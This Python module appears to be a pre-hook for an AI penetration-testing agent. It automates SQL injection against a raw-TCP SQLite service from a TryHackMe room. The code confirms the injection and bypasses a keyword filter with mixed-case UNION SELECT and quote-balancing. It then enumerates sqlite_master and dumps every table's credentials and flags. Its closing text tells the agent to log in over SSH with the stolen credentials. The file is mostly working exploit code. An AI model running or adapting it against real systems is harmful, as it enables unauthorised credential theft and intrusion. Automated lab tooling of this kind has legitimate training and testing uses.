"""F206 — interactive-TCP-SQLi deterministic foothold (pre_hook).

The gap (validated live on THM Light v1.2): a custom line-based TCP service backed by SQLite
(send a username over a raw socket, it returns that user's password) is SQL-injectable, but it is
NOT a web app — so Kryon's web SQLi tooling (sqlmap/nuclei over HTTP) does not apply, and the local
model floundered: it treated it as a web target (sqlmap on http://, curl /blog) and looped on
``nc -zv`` port-checks without ever sending a username. There is no reasoning shortcut for "this is a
raw-TCP SQLi" — so we make the foothold DETERMINISTIC, the same pattern as wordpress-brute / ad-roast.

This hook drives the full chain over raw sockets:
  1. confirm the injection  (send ``'`` -> SQL error like "unrecognized token")
  2. detect the keyword/comment FILTER (the "--badr" variants block ``--``, ``/*``, ``or``, ``%0b``)
  3. pick a bypass that survives the filter (mixed-case ``uNiOn SeLeCt`` + quote-balancing instead of
     ``--`` comments) and find the column count
  4. enumerate tables via ``sqlite_master``
  5. dump every user table's columns concatenated -> credentials + flags

The loot is injected as authoritative context: the agent narrates a real foothold instead of
re-driving the (unreasoned) injection. Read-only — it only SELECTs. Banca-safe by exclusion (only
fires under the explicit "active tcp sqli pentest" keyword + KRYON_RED_TEAM, like the other actives).
"""

from __future__ import annotations

import re
import socket
import time
from typing import Any

# --- target parsing -----------------------------------------------------------------------

# Candidate ports for the "database application" challenge class when the target carries no :port.
_CANDIDATE_PORTS = (1337, 1234, 31337, 13337, 9999, 4444, 12345)
_PROMPT_MARKERS = ("username", "database", "login", "password", "enter your", "welcome to")

# SQL-error fingerprints (SQLite-leaning, but the generic ones catch MySQL/Postgres too).
_SQL_ERR_RE = re.compile(
    r"unrecognized token|sql(ite)?\s*error|syntax error|near \"|unterminated|"
    r"no such (table|column)|LIMIT \d|incomplete input|malformed",
    re.I,
)
_FILTER_RE = re.compile(r"not allowed|forbidden|blocked|illegal|invalid character", re.I)
# The value the app echoes back (the "password" slot is where injected data surfaces).
_RESULT_RE = re.compile(
    r"(?:password|result|output|data|value|flag)\s*[:=]\s*(.+?)(?:\s*please enter|\s*welcome|\s*$)",
    re.I | re.S,
)
_FLAG_RE = re.compile(r"(?:flag|thm)\W{0,3}\{[^}]*\}|THM\{[^}]*\}", re.I)


def _host_port(target: str) -> tuple[str, int | None]:
    """Parse host + optional port from ``host:port`` / ``scheme://host:port`` / bare host."""
    t = (target or "").strip()
    if not t:
        return "", None
    t = re.sub(r"^[a-z]+://", "", t, flags=re.I)
    t = t.split("/", 1)[0]
    if ":" in t:
        host, _, p = t.rpartition(":")
        try:
            return host, int(p)
        except ValueError:
            return t, None
    return t, None


# --- raw-socket transport -----------------------------------------------------------------


def _send(host: str, port: int, payload: str, timeout: float = 6.0) -> str:
    """Connect, swallow the banner/prompt, send one payload line, return the response text.

    Never raises — a dead service / closed port yields ''. The brief sleep lets the prompt-based
    server finish its reply before we read (most echo "Password: X" then re-prompt)."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            try:
                s.recv(4096)  # initial banner / "enter your username:"
            except (TimeoutError, OSError):
                pass
            s.sendall((payload + "\n").encode("utf-8", "replace"))
            time.sleep(0.4)
            out = b""
            try:
                for _ in range(4):
                    chunk = s.recv(8192)
                    if not chunk:
                        break
                    out += chunk
                    if len(chunk) < 8192:
                        break
            except (TimeoutError, OSError):
                pass
            return out.decode("utf-8", "replace")
    except Exception:
        return ""


def _result(resp: str) -> str:
    """Extract the value the app echoes back (after the password/result marker), stripping prompts."""
    m = _RESULT_RE.search(resp)
    return m.group(1).strip() if m else ""


def _is_sql_error(resp: str) -> bool:
    return bool(_SQL_ERR_RE.search(resp))


def _is_filtered(resp: str) -> bool:
    return bool(_FILTER_RE.search(resp))


def _find_db_port(host: str) -> int | None:
    """Probe the candidate ports for an interactive prompt-driven service; return the first match."""
    for port in _CANDIDATE_PORTS:
        banner = _send(host, port, "", timeout=4.0)
        if banner and any(mk in banner.lower() for mk in _PROMPT_MARKERS):
            return port
    return None


# --- SQLi engine --------------------------------------------------------------------------


def _build(core: str, style: str) -> str:
    """Wrap a ``uNiOn SeLeCt ...`` core into a single-quote breakout the filter survives.

    style='comment'  -> close with ``-- -`` (when the app allows SQL comments)
    style='balance'  -> close with `` WHERE 'a'='a`` so the app's trailing ``' LIMIT n`` lands on a
                        valid string literal (needed when ``--``/``/*`` are filtered — THM Light)."""
    if style == "comment":
        return f"z' {core}-- -"
    return f"z' {core} WHERE 'a'='a"


def _find_union(host: str, port: int) -> tuple[int, str] | None:
    """Discover (column_count, bypass_style): the smallest ncols whose mixed-case UNION reflects a
    sentinel without a SQL error or a filter rejection. Tries the comment style first, then balance."""
    sentinel = "8311753"
    for style in ("comment", "balance"):
        for ncols in range(1, 6):
            cols = ",".join([sentinel] * ncols)
            resp = _send(host, port, _build(f"uNiOn SeLeCt {cols}", style))
            if sentinel in resp and not _is_sql_error(resp) and not _is_filtered(resp):
                return ncols, style
    return None


def _dump(host: str, port: int, expr: str, ncols: int, style: str, table: str | None = None) -> str:
    """Run a UNION that places ``expr`` in every column (so whichever column the app displays carries
    our data) and returns the echoed value. ``table`` appends ``FROM <table>`` when set."""
    cols = ",".join([expr] * ncols)
    core = f"uNiOn SeLeCt {cols}"
    if table:
        core += f" FROM {table}"
    return _result(_send(host, port, _build(core, style)))


def _parse_columns(create_sql: str) -> dict[str, list[str]]:
    """Parse ``CREATE TABLE name(col type, ...)`` statements into {table: [columns]}."""
    out: dict[str, list[str]] = {}
    # group_concat(sql) joins CREATE statements with commas (no ';'), so anchor on the column-list
    # parens directly: ``( ... )`` up to the first ')'. (Column types with parens like varchar(255)
    # are a known edge — the DB-app class uses bare types.)
    for m in re.finditer(r"CREATE\s+TABLE\s+[\"'`]?(\w+)[\"'`]?\s*\(([^)]*)\)", create_sql, re.I | re.S):
        table = m.group(1)
        cols: list[str] = []
        for part in m.group(2).split(","):
            name = part.strip().strip("\"'`").split()
            if name and name[0].upper() not in ("PRIMARY", "FOREIGN", "UNIQUE", "CONSTRAINT", "CHECK"):
                cols.append(name[0])
        if cols:
            out[table] = cols
    return out


def _exploit(host: str, port: int) -> list[str]:
    """Full deterministic chain. Returns the report lines (empty list -> no injection confirmed)."""
    lines: list[str] = []

    # 1. confirm the injection.
    probe = _send(host, port, "'")
    if not _is_sql_error(probe):
        return []
    db = "SQLite" if re.search(r"unrecognized token|LIMIT \d|no such (table|column)", probe, re.I) else "SQL"
    err = (_SQL_ERR_RE.search(probe).group(0) if _SQL_ERR_RE.search(probe) else "").strip()
    lines.append(f"  - SQLi CONFIRMED ({db}): a single quote -> \"{err}\"")

    # 2. detect the filter (best-effort, informational).
    filt = _send(host, port, "x' union select 1-- -")
    if _is_filtered(filt):
        blocked = re.sub(r".*?(not allowed|forbidden|blocked)\D*", r"", filt, flags=re.I).strip()[:80]
        lines.append(f"  - filter detected (blocked tokens): {blocked or 'lowercase union/select or comments'}")
        lines.append("    bypass = mixed-case uNiOn SeLeCt + quote-balancing (no -- comments)")

    # 3. find the working UNION (column count + bypass style).
    found = _find_union(host, port)
    if not found:
        lines.append("  - injection present but no UNION reflected (blind? non-SQLite?) — needs manual follow-up")
        return lines
    ncols, style = found
    lines.append(f"  - UNION works: {ncols} column(s), bypass style = {style}")

    # 4. enumerate tables + schema (SQLite metadata).
    tbls_raw = _dump(host, port, "group_concat(tbl_name)", ncols, style, "sqlite_master")
    tables = [t for t in re.split(r"[,\s]+", tbls_raw) if t and not t.lower().startswith("sqlite_")]
    if tables:
        lines.append(f"  - tables: {', '.join(tables)}")
    schema = _dump(host, port, "group_concat(sql)", ncols, style, "sqlite_master")
    cols_by_table = _parse_columns(schema)

    # 5. dump every user table.
    flags: list[str] = []
    for table in tables or list(cols_by_table):
        cols = cols_by_table.get(table) or ["*"]
        if cols == ["*"]:
            expr = "group_concat(\"" + table + "\".rowid)"  # last-ditch; usually we have real columns
        else:
            joined = "||':'||".join(cols)
            expr = f"group_concat({joined})"
        data = _dump(host, port, expr, ncols, style, table)
        if data:
            lines.append(f"  - {table}: {data[:400]}")
            flags += [f.group(0) for f in _FLAG_RE.finditer(data)]

    if flags:
        lines.append(f"  - FLAG(S): {', '.join(sorted(set(flags)))}")
    return lines


def run(ctx: dict[str, Any]) -> str:
    """pre_hook entrypoint. Returns an authoritative-context report (never raises)."""
    try:
        host, port = _host_port(ctx.get("target") or ctx.get("host") or "")
        if not host:
            return "[TCP-SQLI] no target host in ctx — skipped"
        if not port:
            port = _find_db_port(host)
        if not port:
            return f"[TCP-SQLI] no interactive prompt-driven service found on {host} — skipped"

        report = _exploit(host, port)
        header = f"[TCP-SQLI] interactive SQL-injection foothold on {host}:{port}"
        if not report:
            return f"{header}\n  - no injection confirmed (service may sanitize input) — fall back to manual enum"
        footer = (
            "  GROUND TRUTH — the credentials/flags above were extracted via SQL injection over the raw "
            "TCP service. Do NOT re-drive the injection or treat this as a web target; use these creds "
            "directly (e.g. SSH / app login with any recovered username:password)."
        )
        return "\n".join([header, *report, footer])
    except Exception as exc:  # never break the turn
        return f"[TCP-SQLI] hook error ({type(exc).__name__}) — skipped"
